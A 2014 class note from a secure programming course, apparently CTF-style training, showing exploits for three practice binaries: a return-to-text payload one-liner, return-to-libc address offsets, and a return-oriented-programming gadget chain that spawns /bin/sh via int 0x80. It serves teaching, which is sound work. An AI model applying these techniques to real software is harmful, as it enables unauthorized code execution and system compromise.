====================
 Secure Programming
====================

:date: 2014-11-04 18:55
:tags: secprog, ctf, return-oriented-programming
:category: note
:slug: secure-programming-20141104
:authors: Zespre Schmidt
:about_author: Bug generator
:email: starbops@gmail.com
:summary: 2014/11/04 Secure Programming Class Note

foo_4
=====

Training for "return to text" attack.

- binsh: 0x0804a030
- system: 0x080483e0

- ``print 'a'*24 + '\xe0\x83\x04\x08' + 'aaaa' + '\x20\x86\x04\x08'``


foo_5
=====

Training for "return to libc" attack.

Notice: libc.so is provided

- ``objdump -d libc.so``
    - 00019970 <__libc_start_main>:
    - 0003fc40 <__libc_system>:
        - offset: 262d0

Example:
Function: libc_start_main's address is :  0xf75f5970
Function: libc_system's address is : 0xf75f5970 + 0x262d0 = 0xf761bc40

- ``objdump -R foo_5``
    - 0804a01c R_386_JUMP_SLOT   __libc_start_main
- 0804a02c <binsh>:
    - actual address: 08048620

foo_6
=====

Training for "return-oriented programming" attack.

- int 0x80
- eax: call what
- ebx, ecx: arguments
- remember the number of pops, smash the stack

Gadget 1
--------

- first gadget: 0x080594ac
- reset eax to 0 by XOR itself
- value for ``pop ebx``: 0x080be568 (/bin/sh)
- return address of first gadget: 0x0805cc5c

.. code-block:: nasm

    80594ac:       31 c0                   xor    eax,eax
    80594ae:       5b                      pop    ebx
    80594af:       c3                      ret

Gadget 2
--------

- second gadget: 0x0805cc5c
- garbage value for ``pop edi``: aaaa
- return address of second gadget: 0x0805cc5c
- repeat 11 times to make eax = 0x0000000b
- last return address of second gadget: 0x0806f0e0

.. code-block:: nasm

    805cc5c:       40                      inc    eax
    805cc5d:       5f                      pop    edi
    805cc5e:       c3                      ret

Gadget 3
--------

third gadget: 0x0806f0e0

.. code-block:: nasm

    806f0e0:       cd 80                   int    0x80
    806f0e2:       c3                      ret

Failed Gadget
-------------

Program received signal SIGSEGV in 0x080db8ce. Still don't know why :(

.. code-block:: nasm

    80db8cd:       40                      inc    eax
    80db8ce:       02 af 0a 0e 0c 41       add    ch,BYTE PTR [edi+0x410c0e0a]
    80db8d4:       c3                      ret

Cannot use ``pop eax`` because 0x0000000b contains 00 which is null. It will
terminate the input string unexpectedly.

.. code-block:: nasm

    80e205d:  58                      pop    eax
    80e205e:  c3                      ret

